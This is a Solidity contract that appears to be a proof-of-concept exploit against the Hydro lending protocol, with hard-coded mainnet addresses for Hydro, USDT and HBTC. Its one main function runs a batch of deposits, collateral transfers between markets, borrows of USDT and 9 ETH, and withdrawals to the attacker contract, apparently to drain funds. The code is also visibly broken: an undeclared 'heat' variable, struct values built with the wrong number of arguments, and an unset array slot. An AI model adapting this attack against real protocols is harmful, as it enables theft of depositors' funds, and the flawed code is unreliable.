pragma solidity 0.8.27;
import "hardhat/console.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
    function withdraw( uint requestedAmount) external;
}

interface IUsdt {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external;
    function approve(address spender, uint value) external;
    function transferFrom(address from, address to, uint value) external;
}

interface IHydro {
    struct AuctionDetails {
        address borrower;
        uint16  marketID;
        address debtAsset;
        address collateralAsset;
        uint256 leftDebtAmount;
        uint256 leftCollateralAmount;
        uint256 ratio;
        uint256 price;
        bool    finished;
    }

    struct Action {
        ActionType actionType;  // The action type
        bytes encodedParams;    // Encoded params, it's different for each action
    }

    enum ActionType {
        Deposit,   // Move asset from your wallet to tradeable balance
        Withdraw,  // Move asset from your tradeable balance to wallet
        Transfer,  // Move asset between tradeable balance and margin account
        Borrow,    // Borrow asset from pool
        Repay,     // Repay asset to pool
        Supply,    // Move asset from tradeable balance to pool to earn interest
        Unsupply   // Move asset from pool back to tradeable balance
    }

    function batch(
        Action[] memory actions
    ) external;

    enum BalanceCategory {
        Common,
        CollateralAccount
    }

    struct BalancePath {
        BalanceCategory category;
        uint16          marketID;
        address         user;
    }

    struct TransferParam {
        address asset;
        BalancePath fromBalancePath;
        BalancePath toBalancePath;
        uint256 amount;
    }

    struct BorrowParam {
        uint16 marketID;
        address asset;
        uint256 amount;
    }

    struct DepositWithdrawParam {
        address asset;
        uint256 amount;
    }

    function getMarketTransferableAmount(
        uint16 marketID,
        address asset,
        address user
    )
        external
        view
        returns (uint256 amount);

    function liquidateAccount(
        address user,
        uint16 marketID
    )
        external
        returns (bool hasAuction, uint32 auctionID);

    function getAssetOraclePrice(address assetAddress)
        external
        view
        returns (uint256 price);

    function fillAuctionWithAmount(
        uint32 auctionID,
        uint256 amount
    ) external;

     function getPoolCashableAmount(address asset)
        external
        view
        returns (uint256 cashableAmount);

     function getAuctionDetails(uint32 auctionID)
        external
        view
        returns (AuctionDetails memory details);

    function balanceOf(
        address asset,
        address user
    )
        external
        view
        returns (uint256 balance);
}

contract Test{
    IHydro hydro = IHydro(0x241e82C79452F51fbfc89Fac6d912e021dB1a3B7);
    IUsdt usdt = IUsdt(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 hbtc = IERC20(0x0316EB71485b0Ab14103307bf65a021042c6d380);
    address ethName = 0x000000000000000000000000000000000000000E;

    constructor() {
        heat = msg.sender;
    }

    modifier onlyHeat {
        require(heat == msg.sender, "not heat");
        _;
    }

    function fuck() public{
        uint amount = 50000*1e6;
        hbtc.transferFrom(msg.sender,address(this),1e18);
        hbtc.approve(address(hydro),type(uint).max);
        usdt.transferFrom(msg.sender,address(this),50000*1e6);
        usdt.approve(address(hydro),50000*1e6);

        IHydro.DepositWithdrawParam memory usdtdepositParam = IHydro.DepositWithdrawParam(address(usdt), amount);
        IHydro.DepositWithdrawParam memory hbtcdepositParam = IHydro.DepositWithdrawParam(address(hbtc), 1e18);
        IHydro.DepositWithdrawParam memory usdtwithdrawParam = IHydro.DepositWithdrawParam(address(usdt), amount, address(this));
        IHydro.DepositWithdrawParam memory etdwithdrawParam  = IHydro.DepositWithdrawParam(ethName, 9*1e18, address(this));
        IHydro.Action[] memory actions = new IHydro.Action[](10);
        actions[0] = IHydro.Action(IHydro.ActionType.Deposit, abi.encode(usdtdepositParam));
        actions[1] = IHydro.Action(IHydro.ActionType.Deposit, abi.encode(hbtcdepositParam));
        actions[2] = IHydro.Action(IHydro.ActionType.Transfer, abi.encode(
            address(hbtc),
            IHydro.BalancePath(IHydro.BalanceCategory.Common, 0, address(this)), 
            IHydro.BalancePath(IHydro.BalanceCategory.CollateralAccount, 5, address(this)),
            1e18
        ));
        actions[4] = IHydro.Action(IHydro.ActionType.Borrow, abi.encode(
            5, 
            address(usdt), 
            amount
        ));
        actions[5] = IHydro.Action(IHydro.ActionType.Transfer, abi.encode(
            address(usdt),
            IHydro.BalancePath(IHydro.BalanceCategory.Common, 0, address(this)), 
            IHydro.BalancePath(IHydro.BalanceCategory.CollateralAccount, 1, address(this)),
            50000*1e6
        ));
        actions[6] = IHydro.Action(IHydro.ActionType.Borrow, abi.encode(
            1, 
            ethName, 
            9*1e18
        ));
        actions[7] = IHydro.Action(IHydro.ActionType.Transfer, abi.encode(
            ethName,
            IHydro.BalancePath(IHydro.BalanceCategory.CollateralAccount, 0, address(this)), 
            IHydro.BalancePath(IHydro.BalanceCategory.Common, 1, address(this)),
            9*1e18
        ));
        actions[8] = IHydro.Action(IHydro.ActionType.Withdraw, abi.encode(usdtwithdrawParam));
        actions[9] = IHydro.Action(IHydro.ActionType.Withdraw, abi.encode(etdwithdrawParam));
        hydro.batch(actions);
        console.log("end",usdt.balanceOf(address(this)),address(this).balance);
        
    }

    receive() external payable {}
}
